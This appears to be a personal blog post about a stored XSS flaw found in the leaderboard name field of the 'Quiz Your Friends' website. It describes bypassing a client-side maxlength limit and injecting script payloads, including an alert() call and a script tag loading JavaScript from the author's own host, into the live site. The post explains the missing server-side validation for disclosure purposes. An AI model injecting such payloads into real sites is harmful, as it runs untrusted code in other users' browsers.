---
title: "The \"Quiz Your Friends\" XSS Exploit"
layout: post
---

Note: I have alerted the administrators of this site multiple times about this vulnerability.
One email was sent many years ago, which is more than enough time for [responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure).

## Background

In early 2014, when my "programming" skills consisted of editing web pages with inspect element, I was sent a link from an old friend in a town about 3 hours away.
This was a link to a quiz about them.
I had to answer as many questions right as I could about them and I got a score at the end based on my answers.
It seemed fun enough, so I went for it.
In the following weeks this quiz website became quite a trend amongst my friend group as we all started making quizes to see how well we all knew eachother.

A few weeks into this trend, I was staying at a friends' place and told him about this site,
so he goes and creates his own quiz and sends it to all his friends, group chats, Google Plus groups, et cetera.

## Hackerman


While filling in my friend's survey I thought it would be
funny for them to know it is me without anyone else knowing.
We were young and had `Inspect Element`ed a few things together,
so it was a safe bet that an HTML joke would let them know.

I decided to write my name like so: `<b>Steve</b>`.
Steve is in reference to the [main character](https://minecraft.gamepedia.com/Player) in the video game Minecraft.

<figure>
  <img src="/assets/img/qyf-xss/2-bold.png">
  <figcaption>
    <p>Me typing in my name as <span class="mono">&lt;b&gt;Steve&lt;/b&gt;</span>.</p>
  </figcaption>
</figure>

Now in theory this should have shown in in the leaderboard as: "&lt;b&gt;Steve&lt;/b&gt;"
However, to my horror and excitement, I saw this in the leaderboard:

<figure>
  <img src="/assets/img/qyf-xss/3-steve-board.png">
  <figcaption>
    <p><span class="mono">&lt;b&gt;Steve&lt;/b&gt;</span> displaying in the leaderboard as bold text: <b>Steve</b></p>
  </figcaption>
</figure>

The text "Steve" showed up **in bold** on the leaderboard.
This told me all I needed to know.
How did this happen? You might wonder.

### Server-Side Validation

Here is a great demonstration why you should do most of your validation on the server side.
As a user, I can edit any of the HTML, CSS, or Javascript your server serves to me.

Quiz your friends uses the `maxlength=20` HTML attribute on the name input field.
Imagine trying to fit in a script tag doing anything useful with 20 characters! Don't forget that includes the `<script>` tag.
That would leave 13 characters for Javascript.
Although I'm sure a genius would be able to [code golf](https://code.golf/) that, I know I couldn't.

Now obviously I can edit any HTML that a server has sent to me.
If I open up my inspect element window, I can go ahead and change that `maxlength` attribute to anything I want.
Let's change it to 100!

<figure>
  <img src="/assets/img/qyf-xss/5-maxlength.png" alt='An image of the Quiz Your Friends name input field with inspect element. THe code reads: <font class="style6"><input class="inputbutton" name="takername" type="text" id="takername" maxlength="20" width="425" placeholder="Your First Name" style="text-align: center; text-decoration:inherit; font-size:38px;" tabindex="-1"></font>'>
  <figcaption>
    Manually changing the maxlength attribute. 
  </figcaption>
</figure>

In theory, there is a way that a site can stop people from just putting in their name of any length: server-side validation.
The server *could* check to see if the input is too long and reject it if it is.
The Quiz My Friends server has *no such checks in place*.
Therefore, I can send an almost arbitrary load to them.
Being able to send something potentially very large (more than a few megabytes) is a vulnerability of its own.
Imagine being able to send entire executable programs as your "name" in one of these quizzes?


## Javascript

So I went on my merry way thinking about ways to use malicious javascript.
Then, I thought that might be mean, so I decided to warn users instead.
I filled in the name with a script tag and a call to `alert()` to warn the user about this site.
I edited the max-length attribute to allow me to type a long string like this:

```
<script>alert("Don't use this site. It is not secure!");</script>
```

Sure enough, I got a text from my friend saying: "Tait! I know this is you, why would you do that!"
A bit salty, but who wouldn't be.

## Cross-Site Scripting (XSS)

As my final act, I decided to use a cross-site script that I could edit and have it load with new changes at any time.

I set this as my name:

```
<script src="https://tait.tech/assets/js/hacked.js"></script>
```

This script pops up a warning, telling the user that the site is insecure and it is now redirecting to an article about the attack.
This script redirects to an [older post I made](https://tait.tech/2020/04/25/xss/) about how XSS works.

## Conclusion

Watch out for sketchy websites that may be vulnerable to malicious or insecure sites which are ripe for abuse.
Always check that you are using an encrypted connection, HTTPS.
And if you see any messages warning you that a site is not secure and redirecting you to some random site...
Take their info with a grain of salt.

Happy Hacking, literally :)
